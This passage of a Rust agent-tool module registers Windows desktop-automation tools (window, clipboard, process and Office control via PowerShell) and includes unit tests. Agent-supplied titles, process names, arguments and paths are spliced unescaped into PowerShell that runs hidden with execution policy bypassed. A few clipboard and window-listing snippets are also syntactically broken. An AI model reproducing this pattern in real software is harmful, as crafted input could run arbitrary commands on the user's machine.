        "写入/读取结构化任务清单（对齐 todo_write 机制）。action=set(替换清单)|get(读取)。set 时 items 为 JSON 数组 [{step,status}]，status=completed|in_progress|pending。持久化到 .marguerite/todos.json。参数: action(必填), items(set 时必填，JSON 数组字符串)",
        json!({"type":"object","properties":{
            "action":{"type":"string","enum":["set","get"]},
            "items":{"type":"string"}
        },"required":["action"]}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let store = ws.join(".marguerite").join("todos.json");
                let action = args.get("action").map(|s| s.as_str()).unwrap_or("get");
                match action {
                    "set" => {
                        let items_json = args.get("items").cloned().unwrap_or_default();
                        let items: serde_json::Value = serde_json::from_str(&items_json)
                            .map_err(|e| anyhow!("items 需为 JSON 数组字符串: {e}"))?;
                        if !items.is_array() {
                            return err("items 需为 JSON 数组".into(), "INVALID_PARAMS");
                        }
                        if let Some(parent) = store.parent() {
                            std::fs::create_dir_all(parent)?;
                        }
                        std::fs::write(&store, items.to_string())?;
                        let n = items.as_array().map(|a| a.len()).unwrap_or(0);
                        ok(format!("已记录 {n} 项任务清单"))
                    }
                    _ => {
                        if !store.exists() {
                            return ok("任务清单为空".into());
                        }
                        ok(std::fs::read_to_string(&store)?)
                    }
                }
            })
        }),
    )
}

// ---------------------------------------------------------------------------
// 桌面自动化增强工具（窗口管理 / 剪贴板 / 进程管理 / 应用启动 / WPS 办公）
// ---------------------------------------------------------------------------

/// 窗口管理工具：列出/聚焦/最小化/最大化/关闭窗口
fn window_manage_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "window_manage",
        "窗口管理：列出所有可见窗口、聚焦/最小化/最大化/还原/关闭指定窗口。action=list|focus|minimize|maximize|restore|close。参数: action(必填), title(窗口标题模糊匹配，list 时可省略)。",
        json!({"type":"object","properties":{
            "action":{"type":"string","enum":["list","focus","minimize","maximize","restore","close"]},
            "title":{"type":"string","description":"窗口标题（模糊匹配，如 'WPS'、'Chrome'、'记事本'）"}
        },"required":["action"]}),
        Arc::new(move |args| {
            Box::pin(async move {
                if cfg!(not(target_os = "windows")) {
                    return err("window_manage 当前仅支持 Windows".into(), "NOT_AVAILABLE");
                }
                let action = args.get("action").cloned().unwrap_or_default();
                let title = args.get("title").cloned().unwrap_or_default();
                let ps = match action.as_str() {
                    "list" => r#"
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinList {
    [DllImport("user32.dll")] public static extern bool EnumWindows(EnumWindowsProc cb, IntPtr l);
    [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr h);
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint pid);
    public delegate bool EnumWindowsProc(IntPtr h, IntPtr l);
}
"@
$sb = New-Object System.Text.StringBuilder 256
$results = @()
[WinList]::EnumWindows({ param($h,$l)
    if ([WinList]::IsWindowVisible($h)) {
        [void][WinList]::GetWindowText($h, $sb, 256)
        $t = $sb.ToString()
        if ($t.Length -gt 0) {
            $pid = 0; [void][WinList]::GetWindowThreadProcessId($h, [ref]$pid)
            $pname = (Get-Process -Id $pid -ErrorAction SilentlyContinue).ProcessName
            $results += "$pname|$t"
        }
    }
    $true
}, [IntPtr]::Zero) | Out-Null
$results | Sort-Object -Unique
"#.to_string(),
                    "focus" | "minimize" | "maximize" | "restore" | "close" => {
                        if title.is_empty() {
                            return err(format!("{action} 操作需要 title 参数"), "INVALID_PARAMS");
                        }
                        let (ps_verb, post) = match action.as_str() {
                            "focus" => ("SetForegroundWindow($h)", ""),
                            "minimize" => ("CloseWindow($h)", ""),
                            "maximize" => ("ShowWindowAsync($h,3)", ""),
                            "restore" => ("ShowWindowAsync($h,9)", ""),
                            "close" => ("PostMessage($h,0x0010,0,0)", ""),
                            _ => unreachable!(),
                        };
                        format!(r#"
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinCtl {{
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h);
    [DllImport("user32.dll")] public static extern bool CloseWindow(IntPtr h);
    [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr h, int n);
    [DllImport("user32.dll")] public static extern bool PostMessage(IntPtr h, uint m, IntPtr w, IntPtr l);
}}
"@
$procs = Get-Process | Where-Object {{ $_.MainWindowTitle -like "*{title}*" }}
foreach ($p in $procs) {{
    $h = $p.MainWindowHandle
    if ($h -ne [IntPtr]::Zero) {{ [void][WinCtl]::{ps_verb}; "$($p.ProcessName): OK{post}" }}
}}
if (-not $procs) {{ "未找到标题包含 '{title}' 的窗口" }}
"#)
                    }
                    _ => return err(format!("未知 action: {action}"), "INVALID_PARAMS"),
                };
                run_powershell(&ps).await
            })
        }),
    )
}

/// 剪贴板工具：读取/写入/清空剪贴板
fn clipboard_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "clipboard",
        "剪贴板操作：读取当前剪贴板文本、写入文本到剪贴板、清空剪贴板。action=read|write|clear。参数: action(必填), text(write 时必填)。",
        json!({"type":"object","properties":{
            "action":{"type":"string","enum":["read","write","clear"]},
            "text":{"type":"string","description":"write 时要写入剪贴板的文本"}
        },"required":["action"]}),
        Arc::new(move |args| {
            Box::pin(async move {
                if cfg!(not(target_os = "windows")) {
                    return err("clipboard 当前仅支持 Windows".into(), "NOT_AVAILABLE");
                }
                let action = args.get("action").cloned().unwrap_or_default();
                let ps = match action.as_str() {
                    "read" => "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard::GetText()]".to_string(),
                    "write" => {
                        let text = args.get("text").cloned().unwrap_or_default();
                        std::env::set_var("MARG_CLIP_TEXT", text);
                        "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard::SetText($env:MARG_CLIP_TEXT); 'clipboard written'".to_string()
                    }
                    "clear" => "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard::Clear(); 'clipboard cleared'".to_string(),
                    _ => return err(format!("未知 action: {action}"), "INVALID_PARAMS"),
                };
                run_powershell(&ps).await
            })
        }),
    )
}

/// 进程管理工具：列出/启动/终止进程
fn process_manage_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "process_manage",
        "进程管理：列出运行中的进程（可按名称过滤）、启动应用程序、终止进程。action=list|start|kill。参数: action(必填), name(进程名或应用路径，如 'notepad'、'chrome'、'winword'), args(启动参数)。",
        json!({"type":"object","properties":{
            "action":{"type":"string","enum":["list","start","kill"]},
            "name":{"type":"string","description":"进程名（list/kill）或应用路径/命令（start）"},
            "args":{"type":"string","description":"启动参数"}
        },"required":["action"]}),
        Arc::new(move |args| {
            Box::pin(async move {
                if cfg!(not(target_os = "windows")) {
                    return err("process_manage 当前仅支持 Windows".into(), "NOT_AVAILABLE");
                }
                let action = args.get("action").cloned().unwrap_or_default();
                let name = args.get("name").cloned().unwrap_or_default();
                let ps = match action.as_str() {
                    "list" => {
                        if name.is_empty() {
                            "Get-Process | Where-Object { $_.MainWindowTitle -ne '' -or $_.CPU -gt 1 } | Sort-Object CPU -Descending | Select-Object -First 50 | ForEach-Object { \"$($_.Id)|$($_.ProcessName)|$([math]::Round($_.CPU,1))s|$($_.MainWindowTitle)\" }".to_string()
                        } else {
                            format!("Get-Process -Name '*{name}*' -ErrorAction SilentlyContinue | ForEach-Object {{ \"$($_.Id)|$($_.ProcessName)|$([math]::Round($_.CPU,1))s\" }}")
                        }
                    }
                    "start" => {
                        if name.is_empty() {
                            return err("start 需要 name 参数（应用路径或命令）".into(), "INVALID_PARAMS");
                        }
                        let args_str = args.get("args").cloned().unwrap_or_default();
                        if args_str.is_empty() {
                            format!("Start-Process '{name}'; 'started: {name}'")
                        } else {
                            format!("Start-Process '{name}' -ArgumentList '{args_str}'; 'started: {name} {args_str}'")
                        }
                    }
                    "kill" => {
                        if name.is_empty() {
                            return err("kill 需要 name 参数（进程名或 PID）".into(), "INVALID_PARAMS");
                        }
                        format!("Stop-Process -Name '*{name}*' -Force -ErrorAction SilentlyContinue; Stop-Process -Id {name} -Force -ErrorAction SilentlyContinue; 'killed: {name}'")
                    }
                    _ => return err(format!("未知 action: {action}"), "INVALID_PARAMS"),
                };
                run_powershell(&ps).await
            })
        }),
    )
}

/// 办公自动化工具：操控 WPS/Office（新建文档、打开文件、保存、导出 PDF）
fn office_automation_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "office_automation",
        "办公软件自动化（WPS/MS Office COM）：创建/打开 Word/Excel/PPT 文档，写入内容，保存，导出 PDF。action=create_word|create_excel|create_ppt|open|save|export_pdf。参数: action(必填), path(文件路径), content(写入内容，Word/PPT 支持纯文本), data(Excel 数据，JSON 二维数组)。",
        json!({"type":"object","properties":{
            "action":{"type":"string","enum":["create_word","create_excel","create_ppt","open","save","export_pdf"]},
            "path":{"type":"string","description":"文件保存路径（.docx/.xlsx/.pptx）"},
            "content":{"type":"string","description":"要写入的文本内容（Word/PPT）"},
            "data":{"type":"string","description":"Excel 数据（JSON 二维数组，如 [[\"A1\",\"B1\"],[\"A2\",\"B2\"]]）"}
        },"required":["action","path"]}),
        Arc::new(move |args| {
            Box::pin(async move {
                if cfg!(not(target_os = "windows")) {
                    return err("office_automation 当前仅支持 Windows".into(), "NOT_AVAILABLE");
                }
                let action = args.get("action").cloned().unwrap_or_default();
                let path = args.get("path").cloned().unwrap_or_default();
                if path.is_empty() {
                    return err("path 参数必填".into(), "INVALID_PARAMS");
                }
                let ps = match action.as_str() {
                    "create_word" => {
                        let content = args.get("content").cloned().unwrap_or_default();
                        std::env::set_var("MARG_OFFICE_CONTENT", content);
                        format!(r#"
$w = New-Object -ComObject Word.Application
$w.Visible = $false
$doc = $w.Documents.Add()
$doc.Content.Text = $env:MARG_OFFICE_CONTENT
$doc.SaveAs2("{path}")
$doc.Close()
$w.Quit()
"created: {path}""#)
                    }
                    "create_excel" => {
                        let data = args.get("data").cloned().unwrap_or_else(|| "[]".to_string());
                        std::env::set_var("MARG_EXCEL_DATA", data);
                        format!(r#"
$e = New-Object -ComObject Excel.Application
$e.Visible = $false
$wb = $e.Workbooks.Add()
$ws = $wb.ActiveSheet
$rows = $env:MARG_EXCEL_DATA | ConvertFrom-Json
$r = 1
foreach ($row in $rows) {{ $c = 1; foreach ($cell in $row) {{ $ws.Cells.Item($r,$c) = $cell; $c++ }}; $r++ }}
$wb.SaveAs("{path}")
$wb.Close()
$e.Quit()
"created: {path}""#)
                    }
                    "create_ppt" => {
                        let content = args.get("content").cloned().unwrap_or_default();
                        std::env::set_var("MARG_OFFICE_CONTENT", content);
                        format!(r#"
$p = New-Object -ComObject PowerPoint.Application
$pres = $p.Presentations.Add()
$slide = $pres.Slides.Add(1, 1)
$slide.Shapes.Item(1).TextFrame.TextRange.Text = $env:MARG_OFFICE_CONTENT
$pres.SaveAs("{path}")
$pres.Close()
$p.Quit()
"created: {path}""#)
                    }
                    "open" => format!("Start-Process '{path}'; 'opened: {path}'"),
                    "save" => format!("'save 请通过 create_* 动作保存'"),
                    "export_pdf" => {
                        let ext = std::path::Path::new(&path)
                            .extension().and_then(|e| e.to_str()).unwrap_or("");
                        let pdf_path = format!("{}pdf", path.trim_end_matches(ext));
                        match ext {
                            "docx" | "doc" => format!(r#"
$w = New-Object -ComObject Word.Application
$w.Visible = $false
$doc = $w.Documents.Open("{path}")
$doc.SaveAs2("{pdf_path}", 17)
$doc.Close()
$w.Quit()
"exported: {pdf_path}""#),
                            "xlsx" | "xls" => format!(r#"
$e = New-Object -ComObject Excel.Application
$e.Visible = $false
$wb = $e.Workbooks.Open("{path}")
$wb.ExportAsFixedFormat(0, "{pdf_path}")
$wb.Close()
$e.Quit()
"exported: {pdf_path}""#),
                            "pptx" | "ppt" => format!(r#"
$p = New-Object -ComObject PowerPoint.Application
$pres = $p.Presentations.Open("{path}", $true, $false, $false)
$pres.SaveAs("{pdf_path}", 32)
$pres.Close()
$p.Quit()
"exported: {pdf_path}""#),
                            _ => return err(format!("不支持的文件类型: {ext}"), "INVALID_PARAMS"),
                        }
                    }
                    _ => return err(format!("未知 action: {action}"), "INVALID_PARAMS"),
                };
                run_powershell(&ps).await
            })
        }),
    )
}

/// 运行 PowerShell 脚本并返回结果（静默窗口）
async fn run_powershell(script: &str) -> Result<ToolResult> {
    let mut cmd = tokio::process::Command::new("powershell");
    cmd.args([
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-Command",
        script,
    ]);
    #[cfg(windows)]
    {
        cmd.creation_flags(0x08000000);
    }
    match cmd.output().await {
        Ok(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout).trim().to_string();
            let stderr = String::from_utf8_lossy(&o.stderr).trim().to_string();
            if o.status.success() {
                ok(if stdout.is_empty() {
                    "操作完成".to_string()
                } else {
                    stdout
                })
            } else {
                err(format!("{stdout}\n{stderr}"), "POWERSHELL_ERROR")
            }
        }
        Err(e) => err(format!("执行失败: {e}"), "EXEC_ERROR"),
    }
}

// ---------------------------------------------------------------------------
// 注册入口
// ---------------------------------------------------------------------------

/// 将全部内置原生工具注册到 `registry`，绑定到给定工作区。
///
/// 同时构造命令护栏与 SSRF 防护器（共享），供 shell / web 类工具复用。
pub fn register_builtin_tools(
    registry: &mut ToolRegistry,
    workspace: &Path,
    research_cap: Option<Arc<ResearchCapability>>,
    vision_cap: Option<Arc<VisionCapability>>,
    automation_cap: Option<Arc<Mutex<AutomationManager>>>,
) -> Result<()> {
    let ws = workspace.to_path_buf();
    let guard = Arc::new(CommandGuard::new());
    let ssrf = Arc::new(SsrfGuard::new());
    let versions = Arc::new(VersionManager::new(workspace).ok());

    let mut tools: Vec<Box<dyn ToolExecutor>> = vec![
        read_file_tool(ws.clone()),
        write_file_tool(ws.clone(), versions.clone()),
        append_file_tool(ws.clone(), versions.clone()),
        list_dir_tool(ws.clone()),
        find_files_tool(ws.clone()),
        file_info_tool(ws.clone()),
        grep_tool(ws.clone()),
        codebase_search_tool(ws.clone()),
        code_intel_tool(ws.clone()),
        edit_file_tool(ws.clone(), versions.clone()),
        apply_patch_tool(ws.clone(), versions.clone()),
        glob_file_search_tool(ws.clone()),
        todo_write_tool(ws.clone()),
        copy_file_tool(ws.clone(), versions.clone()),
        move_file_tool(ws.clone()),
        delete_file_tool(ws.clone()),
        make_dir_tool(ws.clone()),
        shell_exec_tool(ws.clone(), guard.clone()),
        crate::tools::code::code_exec_tool(),
        web_fetch_tool(ssrf.clone()),
        http_request_tool(ssrf.clone()),
        web_search_tool(),
        web_research_tool(ssrf.clone()),
        browser_tool(ws.clone(), vision_cap.clone()),
        system_control_tool(),
        window_manage_tool(),
        clipboard_tool(),
        process_manage_tool(),
        office_automation_tool(),
        json_query_tool(),
        diff_tool(),
        count_lines_tool(ws.clone()),
        read_env_tool(),
        git_tool(ws.clone(), Arc::new(SystemGitRunner)),
    ];
    // 记忆层工具（SQLite 持久化 + 语义检索），与 self-evolution 台账共用 ExperienceLedger
    tools.extend(memory_tools(user_memory_dir()));

    for t in tools {
        registry.register_local(t);
    }

    // 计算机操控三层工具（屏幕感知 / 键鼠控制 / GUI 定位），融合自 10 个 computer use 仓库
    // 注入视觉能力后 locate 完成「截图→VLMM坐标→(可选)自动点击」闭环
    register_computer_use_tools(registry, workspace, vision_cap.clone())?;

    // 深度研究（E 期 research/ 能力落地）：编排器持有的 ResearchCapability 注入此工具，
    // 让 lead / 子 Agent 在运行时可调用本地 BM25 检索 + LLM 综合的研究 pipeline。
    // 仅在编排器传入能力实例时注册（独立工具测试不传，保持 20 个原生工具基线）。
    if let Some(cap) = research_cap {
        let cap = cap.clone();
        registry.register_local(boxed(
            "research",
            "深度研究：将查询分解为子问题，基于本地知识库（BM25）检索，综合生成 Markdown 研究报告。",
            json!({
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "研究问题"}
                },
                "required": ["query"]
            }),
            Arc::new(move |args: &HashMap<String, String>| {
                let cap = cap.clone();
                let query = args.get("query").cloned().unwrap_or_default();
                Box::pin(async move {
                    if query.trim().is_empty() {
                        return err("research 需要非空的 query 参数".into(), "INVALID_PARAMS");
                    }
                    let pipeline = cap.research(&query, None).await;
                    ok(format!(
                        "研究完成（{} 个步骤，状态 {}）。\n\n{}",
                        pipeline.steps.len(),
                        pipeline.status,
                        pipeline.final_report
                    ))
                })
            }),
        ));
    }

    // 多模态视觉（E 期 vision/ 能力落地）：编排器持有的 VisionCapability 注入此工具，
    // 让 lead / 子 Agent 在运行时可调用「看图」能力（无视觉能力时优雅降级为元数据说明）。
    // 仅在编排器传入能力实例时注册（独立工具测试不传，保持 20 个原生工具基线）。
    if let Some(cap) = vision_cap {
        let cap = cap.clone();
        let ws = ws.clone();
        registry.register_local(boxed(
            "vision",
            "多模态看图：读取工作区内图片文件，返回视觉模型描述（无视觉能力时优雅降级为元数据说明）。",
            json!({
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "工作区内图片相对路径"}
                },
                "required": ["path"]
            }),
            Arc::new(move |args: &HashMap<String, String>| {
                let cap = cap.clone();
                let ws = ws.clone();
                let path = args.get("path").cloned().unwrap_or_default();
                Box::pin(async move {
                    if path.trim().is_empty() {
                        return err("vision 需要非空的 path 参数".into(), "INVALID_PARAMS");
                    }
                    let abs = match safe_resolve(&ws, &path) {
                        Ok(p) => p,
                        Err(e) => return err(format!("路径解析失败: {e}"), "INVALID_PATH"),
                    };
                    match std::fs::read(&abs) {
                        Ok(bytes) => {
                            // 双轨看图：优先原生多模态；无视觉能力时回退为二进制→HTML，
                            // 让无视觉模型也能据此「阅读」图片内容（而非仅返回元数据告警）。
                            let (native, content) = cap.describe_with_fallback(&bytes, "").await;
                            if native {
                                ok(content)
                            } else {
                                ok(format!(
                                    "[视觉降级·HTML 兜底] 当前模型无原生多模态，已把图片转为可读 HTML，请据此描述：\n\n{content}"
                                ))
                            }
                        }
                        Err(e) => err(format!("读取图片失败: {e}"), "READ_ERROR"),
                    }
                })
            }),
        ));
    }

    // 自动化（E 期 automation/ 能力落地）：编排器持有的 AutomationManager 注入此工具，
    // 让 lead / 子 Agent 在运行时可注册 / 触发 / 查询定时自动化（含内置 10 维审计轮转）。
    // 仅在编排器传入能力实例时注册（独立工具测试不传，保持 20 个原生工具基线）。
    if let Some(cap) = automation_cap {
        let cap = cap.clone();
        registry.register_local(boxed(
            "automation",
            "自动化调度：注册/查询/触发定时任务（含内置 10 维审计轮转）。action: list|register|run|enable|disable。",
            json!({
                "type": "object",
                "properties": {
                    "action": {"type": "string", "description": "list|register|run|enable|disable"},
                    "id": {"type": "string", "description": "自动化 ID（register/run/enable/disable 必填）"},
                    "name": {"type": "string", "description": "名称（register 必填）"},
                    "cron": {"type": "string", "description": "标准 5 字段 cron（register 必填）"},
                    "job": {"type": "string", "description": "audit|report|distill|custom（register 必填）"},
                    "command": {"type": "string", "description": "custom 任务的命令（job=custom 必填）"}
                },
                "required": ["action"]
            }),
            Arc::new(move |args: &HashMap<String, String>| {
                let cap = cap.clone();
                let action = args.get("action").cloned().unwrap_or_default();
                let id = args.get("id").cloned().unwrap_or_default();
                let name = args.get("name").cloned().unwrap_or_default();
                let cron = args.get("cron").cloned().unwrap_or_default();
                let job = args.get("job").cloned().unwrap_or_default();
                let command = args.get("command").cloned().unwrap_or_default();
                Box::pin(async move {
                    let mut mgr = cap.lock().unwrap();
                    match action.as_str() {
                        "list" => {
                            let lines: Vec<String> = mgr
                                .list()
                                .iter()
                                .map(|a| {
                                    format!(
                                        "{}\t{}\t{}\t{}\t{}",
                                        a.id, a.name, a.cron_expr, a.job.name(), a.enabled
                                    )
                                })
                                .collect();
                            ok(format!("已注册 {} 个自动化:\n{}", mgr.list().len(), lines.join("\n")))
                        }
                        "register" => {
                            if id.is_empty() || name.is_empty() || cron.is_empty() || job.is_empty() {
                                return err(
                                    "register 需要 id/name/cron/job 全部参数".into(),
                                    "INVALID_PARAMS",
                                );
                            }
                            let jk = match job.as_str() {
                                "audit" => JobKind::Audit,
                                "report" => JobKind::Report,
                                "distill" => JobKind::Distill,
                                "custom" => {
                                    if command.is_empty() {
                                        return err(
                                            "job=custom 需要 command 参数".into(),
                                            "INVALID_PARAMS",
                                        );
                                    }
                                    JobKind::Custom { command }
                                }
                                other => {
                                    return err(format!("未知 job 类型: {other}"), "INVALID_PARAMS");
                                }
                            };
                            match Automation::new(&id, &name, &cron, jk) {
                                Ok(auto) => match mgr.register(auto) {
                                    Ok(_) => ok(format!("已注册自动化 {id} ({cron})")),
                                    Err(e) => err(format!("注册失败: {e}"), "REGISTER_FAILED"),
                                },
                                Err(e) => err(format!("cron 校验失败: {e}"), "INVALID_CRON"),
                            }
                        }
                        "run" => {
                            if id.is_empty() {
                                return err("run 需要 id 参数".into(), "INVALID_PARAMS");
                            }
                            // 注意：mgr 锁在 run 调用期间仍持有；run 是同步且不跨 await，安全。
                            match mgr.run(&id) {
                                Ok(rec) => ok(format!(
                                    "运行完成 run_id={} 状态={} 结果={:?}",
                                    rec.run_id, rec.status.as_str(), rec.result
                                )),
                                Err(e) => err(format!("运行失败: {e}"), "RUN_FAILED"),
                            }
                        }
                        "enable" | "disable" => {
                            if id.is_empty() {
                                return err(format!("{action} 需要 id 参数"), "INVALID_PARAMS");
                            }
                            let r = if action == "enable" {
                                mgr.enable(&id)
                            } else {
                                mgr.disable(&id)
                            };
                            match r {
                                Ok(_) => ok(format!("已{} {id}", action)),
                                Err(e) => err(format!("操作失败: {e}"), "OP_FAILED"),
                            }
                        }
                        other => err(format!("未知 action: {other}"), "INVALID_PARAMS"),
                    }
                })
            }),
        ));
    }

    // ── 宝塔面板（BT Panel）MCP 工具集：站点/数据库/文件/FTP/Shell/系统信息 ──
    // 抽取自 baota_bridge（xiaoyuangou），注册为 baota.* 工具；安全默认 dry_run/confirm_exec。
    if let Err(e) = crate::tools::baota::register_baota_tools(registry) {
        // 注册失败不阻断内置工具加载（环境变量缺失时 BT 工具仍注册，调用时返回配置引导错误）
        eprintln!("[baota] 注册宝塔工具失败: {e}");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn setup() -> (ToolRegistry, PathBuf) {
        let dir = std::env::temp_dir().join(format!("marguerite_tools_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("hello.txt"), "line1\nline2\nline3\n").unwrap();
        std::fs::write(dir.join("data.json"), r#"{"a":{"b":[10,20,30]}}"#).unwrap();
        let mut reg = ToolRegistry::new();
        register_builtin_tools(&mut reg, &dir, None, None, None).unwrap();
        (reg, dir)
    }

    fn put(m: &mut HashMap<String, String>, k: &str, v: &str) {
        m.insert(k.to_string(), v.to_string());
    }

    #[tokio::test]
    async fn registers_all_tools() {
        let (reg, dir) = setup();
        assert!(
            reg.local_tool_count() >= 20,
            "expected >=20 tools, got {}",
            reg.local_tool_count()
        );
        for name in [
            "read_file",
            "write_file",
            "grep",
            "shell_exec",
            "web_fetch",
            "json_query",
            "diff",
            "browser",
            "web_search",
            "system_control",
            "memory_save",
            "memory_search",
            "memory_list",
            "apply_patch",
            "glob_file_search",
            "todo_write",
        ] {
            assert!(reg.has_tool(name), "missing tool: {}", name);
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    #[ignore = "需真实网络；手动 --ignored 运行以验证 web_search/web_research 端到端"]
    async fn live_web_research_search_then_read() {
        let (reg, dir) = setup();
        let args = |q: &str, max_read: &str| {
            let mut m = HashMap::new();
            put(&mut m, "q", q);
            put(&mut m, "max_read", max_read);
            m
        };
        let data = |r: ToolResult| match r {
            ToolResult::Success { data, .. } => data,
            other => panic!("应成功: {other:?}"),
        };
        // 1) 纯搜索：结构化 标题/链接/摘要
        let search_text = data(
            reg.execute_local_tool("web_search", &args("Rust KV cache", "1"))
                .await
                .unwrap(),
        );
        assert!(
            search_text.contains("http"),
            "web_search 应含链接: {search_text}"
        );
        // 2) 检索+深读：应含 来源 与 正文摘录
        let text = data(
            reg.execute_local_tool("web_research", &args("Rust KV cache", "2"))
                .await
                .unwrap(),
        );
        assert!(text.contains("【检索"), "缺少检索头: {text}");
        assert!(text.contains("来源:"), "缺少来源标注: {text}");
        assert!(text.contains("正文摘录"), "缺少正文深读: {text}");
        eprintln!(
            "=== web_research 端到端输出（前 1500 字）===\n{}",
            text.chars().take(1500).collect::<String>()
        );
        let _ = std::fs::remove_dir_all(&dir);
    }
    #[tokio::test]
    #[ignore = "需要本机 Chromium；手动运行以验证 browser 工具视觉双通道"]
    async fn live_browser_tool_vision_and_vision_click() {
        use crate::vision::{LocateResult, VisionProviderResolver, VisionTransport};
        use async_trait::async_trait;

        struct CapResolver;
        #[async_trait]
        impl VisionProviderResolver for CapResolver {
            async fn resolve_vision_model(&self) -> Option<String> {
                Some("mock-vision".into())
            }
        }
        struct CapTransport {
            describe_reply: &'static str,
        }
        #[async_trait]
        impl VisionTransport for CapTransport {
            async fn describe(&self, _: &[u8], _: &str, _: &str) -> Result<String, String> {
                Ok(self.describe_reply.to_string())
            }
            async fn locate(&self, _: &[u8], _: &str, _: &str) -> Option<LocateResult> {
                // 按钮 fixed 于 (100,100) 尺寸 120x40 → 中心 (160,120)（相对截图/视口，DPR=1 比例 1:1）
                Some(LocateResult {
                    x: 160.0,
                    y: 120.0,
                    confidence: 0.99,
                })
            }
        }

        let cap = Arc::new(VisionCapability::offline_default());
        cap.set_resolver(Box::new(CapResolver));
        cap.set_transport(Box::new(CapTransport {
            describe_reply: "页面中央有一个 CLICK ME 按钮",
        }));

        let dir =
            std::env::temp_dir().join(format!("marguerite_browser_vis_{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut reg = ToolRegistry::new();
        register_builtin_tools(&mut reg, &dir, None, Some(cap), None).unwrap();

        let html = "data:text/html,<button id='b1' style='position:fixed;left:100px;top:100px;width:120px;height:40px' onclick='window.__clicked=1'>CLICK ME</button>";
        let mut a = HashMap::new();
        put(&mut a, "action", "open");
        put(&mut a, "url", html);
        put(&mut a, "browser_id", "t1");
        let r = reg.execute_local_tool("browser", &a).await.unwrap();
        assert!(r.is_success(), "open 应成功: {r:?}");
        tokio::time::sleep(Duration::from_millis(1200)).await;

        // vision：截图 → 视觉模型描述（mock）
        let mut b = HashMap::new();
        put(&mut b, "action", "vision");
        put(&mut b, "browser_id", "t1");
        let r = reg.execute_local_tool("browser", &b).await.unwrap();
        if let ToolResult::Success { data, .. } = &r {
            assert!(
                data.contains("CLICK ME 按钮"),
                "vision 描述应包含 mock 回复: {data}"
            );
        } else {
            panic!("vision 应成功: {r:?}");
        }

        // vision_click：截图 → VLM 坐标 → 映射视口 → 真实点击
        let mut c = HashMap::new();
        put(&mut c, "action", "vision_click");
        put(&mut c, "browser_id", "t1");
        put(&mut c, "hint", "点击 CLICK ME 按钮");
        let r = reg.execute_local_tool("browser", &c).await.unwrap();
        assert!(r.is_success(), "vision_click 应成功: {r:?}");

        // 同会话校验点击副作用
        tokio::time::sleep(Duration::from_millis(200)).await;
        let mut d = HashMap::new();
        put(&mut d, "action", "evaluate");
        put(&mut d, "browser_id", "t1");
        put(&mut d, "js", "window.__clicked || 0");
        let r = reg.execute_local_tool("browser", &d).await.unwrap();
        if let ToolResult::Success { data, .. } = &r {
            assert_eq!(
                data.trim(),
                "1",
                "vision_click 应触发按钮 onclick，实际: {data}"
            );
        } else {
            panic!("evaluate 应成功: {r:?}");
        }
        println!(
            "[live] browser 工具视觉双通道通过：vision 描述 + vision_click 坐标点击副作用生效"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn read_and_write_roundtrip() {
        let (reg, dir) = setup();
        let mut a = HashMap::new();
        put(&mut a, "path", "out.txt");
        put(&mut a, "content", "hello world");
        let r = reg.execute_local_tool("write_file", &a).await.unwrap();
        assert!(r.is_success(), "write should succeed");

        let mut b = HashMap::new();
        put(&mut b, "path", "out.txt");
        let r = reg.execute_local_tool("read_file", &b).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => assert_eq!(data, "hello world"),
            _ => panic!("read failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn edit_file_replaces() {
        let (reg, dir) = setup();
        let mut e = HashMap::new();
        put(&mut e, "path", "hello.txt");
        put(&mut e, "old_string", "line2");
        put(&mut e, "new_string", "LINE_TWO");
        let r = reg.execute_local_tool("edit_file", &e).await.unwrap();
        assert!(r.is_success());

        let mut b = HashMap::new();
        put(&mut b, "path", "hello.txt");
        let r = reg.execute_local_tool("read_file", &b).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => assert!(data.contains("LINE_TWO")),
            _ => panic!("read failed"),
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn apply_patch_applies_hunks() {
        let (reg, dir) = setup();
        let mut w = HashMap::new();
        put(&mut w, "path", "src/app.rs");
        put(
            &mut w,
            "content",
            "fn main() {\n    println!(\"a\");\n    println!(\"b\");\n}\n",
        );
        assert!(reg
            .execute_local_tool("write_file", &w)
            .await
            .unwrap()
            .is_success());

        let patch = "--- a/src/app.rs\n+++ b/src/app.rs\n@@ -2,3 +2,4 @@\n-    println!(\"b\");\n+    println!(\"B\");\n+    println!(\"c\");\n }\n";
        let mut a = HashMap::new();
        put(&mut a, "patch", patch);
        let r = reg.execute_local_tool("apply_patch", &a).await.unwrap();
        assert!(r.is_success(), "apply_patch 应成功: {r:?}");

        let mut b = HashMap::new();
        put(&mut b, "path", "src/app.rs");
        let r = reg.execute_local_tool("read_file", &b).await.unwrap();
        match r {
            ToolResult::Success { data, .. } => {
                assert!(data.contains("println!(\"B\")"), "got: {data}");
                assert!(data.contains("println!(\"c\")"), "got: {data}");
